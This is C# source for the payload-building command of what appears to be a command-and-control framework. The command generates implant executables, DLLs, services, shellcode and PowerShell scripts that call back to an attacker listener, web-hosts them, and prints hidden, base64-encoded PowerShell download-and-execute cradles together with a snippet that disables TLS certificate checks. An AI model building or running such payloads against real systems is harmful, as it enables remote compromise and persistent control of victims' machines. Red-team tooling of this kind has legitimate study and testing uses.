using Commander.Executor;
using System;
using System.CommandLine;
using System.CommandLine.NamingConventionBinder;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Text.RegularExpressions;
using Common;
using Common.Payload;
using Commander.Commands.Agent;

namespace Commander.Commands.Laucher
{
    public class BuildPayloadCommandOptions
    {

        public string bindTo { get; set; }

        public string listener { get; set; }

        public string fileName { get; set; }
        public string path { get; set; }

        public bool debug { get; set; }

        public string webhost { get; set; }
        public string webhostAgent { get; set; }
        public string webhostListener { get; set; }

        public bool x86 { get; set; }

        public bool verbose { get; set; }

        public string serverKey { get; set; }

        public string type { get; set; }
    }
    public class BuildPayloadCommand : EnhancedCommand<BuildPayloadCommandOptions>
    {
        public static string PowershellSSlScript = "add-type 'using System.Net;using System.Security.Cryptography.X509Certificates;public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}';[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy;";

        public override string Category => CommandCategory.Core;
        public override string Description => "Create a payload file";
        public override string Name => "payload";

        public override ExecutorMode AvaliableIn => ExecutorMode.All;

        public override RootCommand Command => new RootCommand(this.Description)
        {
            new Option<string>(new[] { "--bindTo", "-b" }, () => null, "endpoint to connect to"),
            new Option<string>(new[] { "--listener", "-l" }, () => null, "listener to connect to"),
            new Option<string>(new[] { "--type", "-t" }, () => "exe" ,"exe | dll | svc | ps | bin | all").FromAmong("exe", "dll", "svc", "ps", "bin", "all"),
            new Option<string>(new[] { "--fileName", "-f" }, () => null ,"Name of the file to be crafted"),
            new Option(new[] { "--debug", "-d" }, "Keep debugging info when building"),
            new Option<string>(new[] { "--path", "-p" }, () => null, "Folder to save the generated file"),
            new Option<string>(new[] { "--serverKey", "-k" }, () => null, "The server unique key of the endpoint"),
            new Option<string>(new[] { "--webhost", "-wh" },() => null, "Path of the file to be Web-Hosted"),
            new Option<string>(new[] { "--webhostAgent", "-wa" },() => null, "Id ot hte Agent to Web-Host on"),
            new Option<string>(new[] { "--webhostListener", "-wl" },() => null, "Listener used to generate Web-Host script (if different fom listener)"),
            new Option(new[] { "--x86", "-x86" }, "Generate a x86 architecture executable"),
            new Option(new[] { "--verbose", "-v" }, "Show details of the command execution."),
        };

        protected override async Task<bool> HandleCommand(CommandContext<BuildPayloadCommandOptions> context)
        {

            var agent = context.Executor.CurrentAgent;

            if(string.IsNullOrEmpty(context.Options.bindTo) && string.IsNullOrEmpty(context.Options.listener))
            {
                context.Terminal.WriteError($"[X] Either an endpoint or a listener should be provided !");
                return false;
            }

            if (!string.IsNullOrEmpty(context.Options.bindTo) && !string.IsNullOrEmpty(context.Options.listener))
            {
                context.Terminal.WriteError($"[X] Only one of endpoint or listener should be provided !");
                return false;
            }


            Models.Listener listener = null;
            if (!string.IsNullOrEmpty(context.Options.listener))
            {
                listener = context.CommModule.GetListeners().FirstOrDefault(l => l.Name.ToLower() == context.Options.listener.ToLower());
                if(listener == null)
                {
                    context.Terminal.WriteError($"[X] Listener {context.Options.listener} not found !");
                    return false;
                }
            }


            if (!string.IsNullOrEmpty(context.Options.webhostListener))
            {
                var l = context.CommModule.GetListeners().FirstOrDefault(l => l.Name.ToLower() == context.Options.webhostListener.ToLower());
                if (l == null)
                {
                    context.Terminal.WriteError($"[X] Listener {context.Options.listener} not found for Web-Hosting!");
                    return false;
                }
            }

            if (!string.IsNullOrEmpty(context.Options.webhostAgent))
            {
                var a = context.CommModule.GetAgent(context.Options.webhostAgent);
                if (a == null)
                {
                    context.Terminal.WriteError($"[X] Agent {context.Options.webhostAgent} not found for Web-Hosting!");
                    return false;
                }
            }

            ConnexionUrl endpoint = null;
            if(listener != null)
                endpoint = ConnexionUrl.FromString(listener.EndPoint);
            else
                endpoint = ConnexionUrl.FromString(context.Options.bindTo);
            if (!endpoint.IsValid)
            {
                context.Terminal.WriteError($"[X] EndPoint is not valid !");
                return false;
            }

            if (context.Options.type == "all")
            {
                foreach (var arch in Enum.GetValues(typeof(PayloadArchitecture)))
                {
                    var archType = (PayloadArchitecture)arch;
                    foreach (var typ in Enum.GetValues(typeof(PayloadType)))
                    {
                        var payType = (PayloadType)typ;

                        var opt = new PayloadGenerationOptions()
                        {
                            Architecture = archType,
                            Endpoint = endpoint,
                            IsDebug = context.Options.debug,
                            IsVerbose = context.Options.verbose,
                            ServerKey = context.Options.serverKey,
                            Type = payType
                        };

                        this.GeneratePayload(context, opt);
                    }
                }

                return true;
            }

            var t = PayloadType.Executable;
            switch (context.Options.type)
            {
                case "dll": t = PayloadType.Library; break;
                case "svc": t = PayloadType.Service; break;
                case "ps": t = PayloadType.PowerShell; break;
                case "bin": t = PayloadType.Binary; break;
                default: break;
            }

            var options = new PayloadGenerationOptions()
            {
                Architecture = context.Options.x86 ? PayloadArchitecture.x86 : PayloadArchitecture.x64,
                Endpoint = endpoint,
                IsDebug = context.Options.debug,
                IsVerbose = context.Options.verbose,
                ServerKey = context.Options.serverKey,
                Type = t
            };

            var ret = this.GeneratePayload(context, options);

            if (!string.IsNullOrEmpty(context.Options.webhost))
            {
                byte[] fileContent = File.ReadAllBytes(ret);
                var path = context.Options.webhost;

                if (!string.IsNullOrEmpty(context.Options.webhostAgent))
                {
                    //Send on the agent
                    //await WebHostCommand.PushFile(context, path, fileContent);
                }
                else
                {
                    context.CommModule.WebHost(path, fileContent);

                    if (options.Type == PayloadType.PowerShell)
                    {
                        if (!string.IsNullOrEmpty(context.Options.webhostListener))
                        {
                            listener = context.CommModule.GetListeners().FirstOrDefault(l => l.Name.ToLower() == context.Options.webhostListener.ToLower());
                        }

                        if (listener == null && agent != null && agent.ListenerId != null)
                        {
                            listener = context.CommModule.GetListeners().FirstOrDefault(l => l.Id == agent.ListenerId);
                        }

                        if (listener != null)
                        {
                            string urlwh = $"{listener.EndPoint}/{path}";
                            context.Terminal.WriteLine($"[*] payload hosted on : {urlwh}");

                            string tmpFile = ShortGuid.NewGuid();

                            string script = null;
                            switch (options.Type)
                            {
                                case PayloadType.PowerShell:
                                    script = $"(New-Object Net.WebClient).DownloadString('{urlwh}') | iex";
                                    break;
                            }


                            if (!string.IsNullOrEmpty(script))
                            {
                                if (listener.Secured)
                                    script = PowershellSSlScript + script;
                                string enc64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));
                                context.Terminal.WriteLine($"[>] Command : powershell -noP -sta -w 1 -c \"{script}\"");
                                context.Terminal.WriteLine($"[>] Command : powershell -noP -sta -w 1 -enc {enc64}");
                            }
                        }
                    }
                }
            }

            return !string.IsNullOrEmpty(ret);
        }

        private string GeneratePayload(CommandContext<BuildPayloadCommandOptions> context, PayloadGenerationOptions options)
        {
            context.Terminal.WriteInfo($"[>] Generating Payload {options.Type} for Endpoint {options.Endpoint} (arch = {options.Architecture}).");
            byte[] pay;
            try
            {
                var generator = new PayloadGenerator(context.Config.PayloadConfig);
                generator.MessageSent += (object sender, string msg) => { if (context.Options.verbose) context.Terminal.WriteLine(msg); };
                pay = generator.GeneratePayload(options);
            }
            catch (Exception ex)
            {
                context.Terminal.WriteError($"[X] Generation Failed!");
                if (context.Options.verbose)
                    context.Terminal.WriteError(ex.ToString());
                return null;
            }

            if (pay == null)
            {
                context.Terminal.WriteError($"[X] Generation Failed!");
                return null;
            }

            var outPath = GetOutputFilePath(context, options);
            File.WriteAllBytes(outPath, pay);

            context.Terminal.WriteSuccess($"[*] Generation succeed.");
            context.Terminal.WriteInfo($"Payload can be found at {outPath}");
            return outPath;
        }


        private string GetOutputFilePath(CommandContext<BuildPayloadCommandOptions> context, PayloadGenerationOptions options)
        {

            var customFileName = !string.IsNullOrEmpty(context.Options.fileName);
            var outFile = string.Empty;
            if (!customFileName)
                outFile = "payload_" + options.Endpoint.ProtocolString + "_" + System.Text.RegularExpressions.Regex.Replace(options.Endpoint.Address, @"[^\w\s]", "_");
            else
                outFile = Path.GetFileNameWithoutExtension(context.Options.fileName);

            if (options.Type == PayloadType.Service && (context.Options.type == "all" || !customFileName))
                outFile += "_svc";

            if (context.Options.type == "all")
                outFile += options.Architecture == PayloadArchitecture.x86 ? "_x86" : "_x64";

            switch (options.Type)
            {
                case PayloadType.Executable:
                case PayloadType.Service:
                    if (!Path.GetExtension(outFile).Equals(".exe", StringComparison.OrdinalIgnoreCase))
                        outFile += ".exe";
                    break;
                case PayloadType.Library:
                    if (!Path.GetExtension(outFile).Equals(".dll", StringComparison.OrdinalIgnoreCase))
                        outFile += ".dll";
                    break;
                case PayloadType.PowerShell:
                    if (!Path.GetExtension(outFile).Equals(".ps1", StringComparison.OrdinalIgnoreCase))
                        outFile += ".ps1";
                    break;
                case PayloadType.Binary:
                    if (!Path.GetExtension(outFile).Equals(".bin", StringComparison.OrdinalIgnoreCase))
                        outFile += ".bin";
                    break;
            }

            string outPath = Path.Combine(context.Config.PayloadConfig.OutputFolder, outFile);
            if (!string.IsNullOrEmpty(context.Options.path))
                outPath = Path.Combine(context.Options.path, outFile);

            return outPath;
        }
    }

}
